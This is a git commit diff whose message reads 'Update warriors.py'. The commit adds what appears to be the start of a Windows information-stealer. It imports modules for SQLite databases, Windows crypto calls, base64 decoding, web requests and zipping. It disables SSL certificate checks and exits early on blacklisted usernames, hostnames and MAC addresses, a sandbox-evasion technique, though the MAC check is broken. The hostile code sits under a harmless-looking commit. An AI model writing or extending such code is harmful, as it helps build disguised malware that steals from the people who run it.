66ee4dea0fa60cc226f8a81a33f1cfc5a0dc4cc2
Robmo0007 <robmorobmo202@gmail.com>
2023-10-01 19:01:24 -0500

    Update warriors.py

--- warriors.py
+++ warriors.py
@@ -1,1 +1,48 @@
-okrqwokreowe
+import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect
+import re
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import *
+import time
+import shutil
+from zipfile import ZipFile
+import random
+import re
+import subprocess
+import sys
+import shutil
+import uuid
+import socket
+import getpass
+import ssl
+
+ssl._create_default_https_context = ssl._create_unverified_context
+
+blacklistUsers = ['DESKTOP-5K2P529']
+
+username = getpass.getuser()
+
+if username.lower() in blacklistUsers:
+    os._exit(0)
+
+def kontrol():
+
+    blacklistUsername = ['DESKTOP-5K2P529']
+
+    hostname = socket.gethostname()
+
+    if any(name in hostname for name in blacklistUsername):
+        os._exit(0)
+
+kontrol()
+
+BLACKLIST1 = ['28-D2-44-77-3E-48']
+
+mac_address = uuid.getnode()
+if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
+    os._exit(0)
